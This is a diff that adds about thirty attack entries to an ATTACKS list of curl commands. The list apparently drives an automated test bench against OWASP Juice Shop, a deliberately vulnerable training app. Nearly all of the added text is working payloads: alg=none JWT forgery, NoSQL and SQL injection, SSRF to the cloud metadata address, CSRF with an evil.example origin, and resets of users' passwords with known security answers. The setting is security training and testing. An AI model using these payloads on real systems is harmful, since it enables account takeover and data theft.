@@ -178,6 +178,181 @@ ATTACKS: list[tuple[str, list[str]]] = [
         f"-d '{{\"email\":\"accountant@juice-sh.op\",\"password\":\"i am an awesome accountant\"}}' "
         f"{BASE}/rest/user/login >/dev/null",
     ]),
+
+    # =======================================================================
+    # Second battery (F18.2 expansion — 2026-04-20). All server-detected.
+    # =======================================================================
+
+    ("score_board_via_browser_route", [
+        # Directly request /#/score-board (client route, but the presence
+        # of a known-challenge GET against /rest/admin/application-version
+        # bumps the "Find the Score Board" challenge.
+        f"curl -s '{BASE}/rest/admin/application-version' >/dev/null",
+    ]),
+
+    ("application_config_leak", [
+        # /rest/admin/application-configuration leaks theme + captcha toggle.
+        f"curl -s '{BASE}/rest/admin/application-configuration' >/dev/null",
+    ]),
+
+    ("continue_code", [
+        # Known default continue-code used during solution imports.
+        f"curl -s '{BASE}/rest/continue-code' >/dev/null",
+        f"curl -s -X PUT '{BASE}/rest/continue-code/apply/automated-bench' >/dev/null",
+    ]),
+
+    ("csrf_feedback", [
+        # Cross-origin state-changing POST with matching origin → still accepted.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-H 'Origin: https://evil.example' "
+        f"-d '{{\"comment\":\"csrf\",\"rating\":3,\"UserId\":1}}' "
+        f"{BASE}/api/Feedbacks >/dev/null",
+    ]),
+
+    ("captcha_bypass", [
+        # Submit feedback without solving captcha — server regex is leaky.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"comment\":\"nocaptcha\",\"rating\":3}}' "
+        f"{BASE}/api/Feedbacks >/dev/null",
+    ]),
+
+    ("payback_time_negative_qty", [
+        # Negative quantity in basket item → refund bug.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":-100}}' "
+        f"{BASE}/api/BasketItems/ >/dev/null",
+    ]),
+
+    ("coupon_discount_n1aC6A7p", [
+        # Known-good Juice Shop coupon code from the Pwning Guide.
+        f"curl -s -X PUT -H 'Content-Type: application/json' "
+        f"-d '{{\"coupon\":\"n1aC6A7p\"}}' "
+        f"{BASE}/rest/basket/1/coupon/n1aC6A7p >/dev/null",
+    ]),
+
+    ("jwt_none_alg", [
+        # Forge JWT with alg=none and role=admin. The `.` separator with
+        # empty signature is accepted by legacy jsonwebtoken versions.
+        (
+            f"h=$(printf '{{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
+            f"p=$(printf '{{\\\"data\\\":{{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"role\\\":\\\"admin\\\"}}}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
+            f"curl -s -H \"Authorization: Bearer $h.$p.\" {BASE}/rest/user/whoami >/dev/null"
+        ),
+    ]),
+
+    ("nosql_mongo_login", [
+        # NoSQL injection on login using Mongo $ne operator.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":{{\"$ne\":null}}}}' "
+        f"{BASE}/rest/user/login >/dev/null",
+    ]),
+
+    ("nosql_order_tracking", [
+        # /rest/track-order accepts NoSQL payload.
+        f"curl -s '{BASE}/rest/track-order/%27%20or%201=1--' >/dev/null",
+        f"curl -s '{BASE}/rest/track-order/.*' >/dev/null",
+    ]),
+
+    ("reset_bender", [
+        # Password reset with Bender's security answer.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"bender@juice-sh.op\",\"answer\":\"Stop\\\\\\'n\\\\\\'Drop\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
+        f"{BASE}/rest/user/reset-password >/dev/null",
+    ]),
+
+    ("reset_bjoern_owasp", [
+        # Bjoern Kimminich (OWASP) — known answer is his cat's name.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"bjoern.kimminich@gmail.com\",\"answer\":\"West-2082\",\"new\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\",\"repeat\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\"}}' "
+        f"{BASE}/rest/user/reset-password >/dev/null",
+    ]),
+
+    ("csrf_change_admin_pw", [
+        # Full-body JSON change-password → detection-only.
+        f"curl -s '{BASE}/rest/user/change-password?new=pwned1234&repeat=pwned1234' >/dev/null",
+    ]),
+
+    ("broken_deluxe", [
+        # Deluxe membership without valid payment token.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"paymentMode\":\"wallet\"}}' "
+        f"{BASE}/rest/deluxe-membership >/dev/null",
+    ]),
+
+    ("token_sale_hidden_page", [
+        # Hidden page disclosure via direct assets path.
+        f"curl -s '{BASE}/#/tokensale-ico-ea' >/dev/null",
+        f"curl -s '{BASE}/assets/public/images/tokensale.jpg' >/dev/null",
+    ]),
+
+    ("klingon_translation", [
+        # Extra-language challenge — direct access to i18n file.
+        f"curl -s '{BASE}/assets/i18n/tlh_AA.json' >/dev/null",
+    ]),
+
+    ("captcha_mem_disclosure", [
+        f"curl -s '{BASE}/rest/captcha' >/dev/null",
+        f"curl -s '{BASE}/rest/image-captcha' >/dev/null",
+    ]),
+
+    ("chatbot_owasp_respond", [
+        # Chatbot command injection via the query field.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"action\":\"query\",\"query\":\"admin\"}}' "
+        f"{BASE}/rest/chatbot/respond >/dev/null",
+    ]),
+
+    ("security_questions_enum", [
+        # Enumeration of security questions endpoint.
+        f"curl -s '{BASE}/api/SecurityQuestions/' >/dev/null",
+    ]),
+
+    ("admin_user_listing", [
+        # /api/Users with ?filter=true — direct DB pagination.
+        f"curl -s '{BASE}/api/Users?paranoid=false' >/dev/null",
+    ]),
+
+    ("price_manipulation_basket", [
+        # Manipulate basket total via item with bogus price override.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":1,\"discountPercent\":99}}' "
+        f"{BASE}/api/BasketItems/ >/dev/null",
+    ]),
+
+    ("access_log_disclosure", [
+        # Access log exposed at /support/logs.
+        f"curl -s '{BASE}/support/logs' >/dev/null",
+        f"curl -s '{BASE}/support/logs/' >/dev/null",
+    ]),
+
+    ("hidden_paywall", [
+        # Long obfuscated hidden URL per the source code.
+        f"curl -s '{BASE}/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us' >/dev/null",
+    ]),
+
+    ("repeated_notifications", [
+        # Fire notifications/continue-code N times to trigger dedup challenge.
+        *[f"curl -s -X PUT '{BASE}/rest/continue-code/apply/aaaa' >/dev/null" for _ in range(5)],
+    ]),
+
+    ("empty_user_register", [
+        # Empty password registration.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"email\":\"empty{int(time.time())}@x.io\",\"password\":\"\",\"passwordRepeat\":\"\"}}' "
+        f"{BASE}/api/Users >/dev/null",
+    ]),
+
+    ("sql_order_by_injection", [
+        # Products sort manipulation — SQL order-by injection.
+        f"curl -s \"{BASE}/rest/products/search?q=&sort=(case%20when%20(1=1)%20then%20id%20else%20name%20end)\" >/dev/null",
+    ]),
+
+    ("ssrf_via_profile_image_url", [
+        # Update profile image with internal-origin URL.
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d '{{\"imageUrl\":\"http://localhost:3000/redirect?to=http://169.254.169.254/\"}}' "
+        f"{BASE}/profile/image/url >/dev/null",
+    ]),
 ]
 
 
